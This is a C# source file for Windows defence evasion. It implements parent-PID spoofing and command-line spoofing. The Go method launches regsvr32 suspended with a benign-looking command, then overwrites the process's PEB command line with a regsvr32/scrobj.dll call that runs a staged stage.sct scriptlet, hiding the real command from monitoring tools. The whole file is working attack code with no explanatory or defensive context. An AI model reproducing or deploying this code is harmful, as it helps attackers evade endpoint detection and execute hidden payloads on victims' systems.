using System;
using System.Runtime.InteropServices;
using System.Text;

public static class Spoof
{
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern bool CreateProcessW(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtQueryInformationProcess(
        IntPtr hProcess,
        int ProcessInformationClass,
        out PROCESS_BASIC_INFORMATION pbi,
        int cb,
        out int returnLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool ReadProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        IntPtr lpBuffer,
        int dwSize,
        out int lpNumberOfBytesRead);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        int dwSize,
        out int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hObject);

    private const uint CREATE_SUSPENDED = 0x00000004;
    private const int ProcessBasicInformation = 0;

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct STARTUPINFO
    {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct PROCESS_BASIC_INFORMATION
    {
        public IntPtr ExitStatus;
        public IntPtr PebBaseAddress;
        public IntPtr AffinityMask;
        public IntPtr BasePriority;
        public IntPtr UniqueProcessId;
        public IntPtr InheritedFromUniqueProcessId;
    }

    private const int CommandLineOffset = 0x70;

    // ============================================================
    // PPID Spoofing: Spawn process with specified parent PID
    // ============================================================

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool InitializeProcThreadAttributeList(
        IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool UpdateProcThreadAttribute(
        IntPtr lpAttributeList, uint dwFlags, IntPtr attribute,
        IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern bool CreateProcess(
        string lpApplicationName, string lpCommandLine,
        IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
        bool bInheritHandles, uint dwCreationFlags,
        IntPtr lpEnvironment, string lpCurrentDirectory,
        ref STARTUPINFOEX lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);

    private const uint PROC_CREATE_PROCESS = 0x0080;
    private const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
    private const uint CREATE_NO_WINDOW = 0x08000000;
    private static readonly IntPtr ProcThreadAttributeParentProcess = new IntPtr(0x00020000);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct STARTUPINFOEX
    {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }

    public static int SpawnWithParent(string cmdLine, int parentPid)
    {
        IntPtr hParent = OpenProcess(PROC_CREATE_PROCESS, false, parentPid);
        if (hParent == IntPtr.Zero)
            return -1;

        IntPtr attrListSize = IntPtr.Zero;
        InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref attrListSize);

        IntPtr attrList = Marshal.AllocHGlobal(attrListSize);
        if (attrList == IntPtr.Zero)
        {
            CloseHandle(hParent);
            return -1;
        }

        if (!InitializeProcThreadAttributeList(attrList, 1, 0, ref attrListSize))
        {
            Marshal.FreeHGlobal(attrList);
            CloseHandle(hParent);
            return -1;
        }

        IntPtr parentPtr = Marshal.AllocHGlobal(IntPtr.Size);
        Marshal.WriteIntPtr(parentPtr, hParent);
        UpdateProcThreadAttribute(attrList, 0, ProcThreadAttributeParentProcess,
            parentPtr, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

        STARTUPINFOEX siEx = new STARTUPINFOEX();
        siEx.StartupInfo.cb = Marshal.SizeOf(typeof(STARTUPINFOEX));

        siEx.lpAttributeList = attrList;

        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        bool created = CreateProcess(null, cmdLine,
            IntPtr.Zero, IntPtr.Zero, false,
            EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
            IntPtr.Zero, null, ref siEx, out pi);

        DeleteProcThreadAttributeList(attrList);
        Marshal.FreeHGlobal(attrList);
        Marshal.FreeHGlobal(parentPtr);
        CloseHandle(hParent);

        if (created)
        {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return pi.dwProcessId;
        }
        return -1;
    }

    public static void Go()
    {
        // C# 5 compatible: all out vars pre-declared (no inline out var declarations)
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
        int retLen = 0;
        int bytesRead = 0;
        int written = 0;
        IntPtr pebBuf = IntPtr.Zero;
        IntPtr cmdBuf = IntPtr.Zero;
        IntPtr processParametersPtr = IntPtr.Zero;
        IntPtr bufferPtr = IntPtr.Zero;

        string spoofedCmd = "regsvr32 /s C:\\Windows\\System32\\jscript.dll";
        string realCmd = "regsvr32 /s /n /u /i:\"C:\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys\\stage.sct\" scrobj.dll";

        STARTUPINFO si = new STARTUPINFO();
        si.cb = Marshal.SizeOf(typeof(STARTUPINFO));

        if (!CreateProcessW(null, spoofedCmd, IntPtr.Zero, IntPtr.Zero, false,
            CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi))
        {
            return;
        }

        if (NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation,
            out pbi, Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)),
            out retLen) != 0)
        {
            ResumeThread(pi.hThread);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return;
        }

        pebBuf = Marshal.AllocHGlobal(IntPtr.Size * 4);
        if (!ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, pebBuf, IntPtr.Size * 4, out bytesRead))
        {
            Marshal.FreeHGlobal(pebBuf);
            ResumeThread(pi.hThread);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return;
        }

        int ppOffset = IntPtr.Size == 8 ? 0x20 : 0x10;
        processParametersPtr = Marshal.ReadIntPtr(pebBuf, ppOffset);
        Marshal.FreeHGlobal(pebBuf);

        cmdBuf = Marshal.AllocHGlobal(16);
        if (!ReadProcessMemory(pi.hProcess, IntPtr.Add(processParametersPtr, CommandLineOffset), cmdBuf, 16, out bytesRead))
        {
            Marshal.FreeHGlobal(cmdBuf);
            ResumeThread(pi.hThread);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return;
        }

        byte[] newCmdBytes = Encoding.Unicode.GetBytes(realCmd);
        bufferPtr = Marshal.ReadIntPtr(cmdBuf, 8);
        Marshal.FreeHGlobal(cmdBuf);

        if (!WriteProcessMemory(pi.hProcess, bufferPtr, newCmdBytes, newCmdBytes.Length, out written))
        {
            ResumeThread(pi.hThread);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return;
        }

        byte[] lengthBytes = BitConverter.GetBytes(newCmdBytes.Length);
        byte[] maxLengthBytes = BitConverter.GetBytes(newCmdBytes.Length);
        byte[] cmdBufBytes = new byte[16];
        Buffer.BlockCopy(lengthBytes, 0, cmdBufBytes, 0, 2);
        Buffer.BlockCopy(maxLengthBytes, 0, cmdBufBytes, 2, 2);
        WriteProcessMemory(pi.hProcess, IntPtr.Add(processParametersPtr, CommandLineOffset), cmdBufBytes, cmdBufBytes.Length, out written);

        ResumeThread(pi.hThread);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}
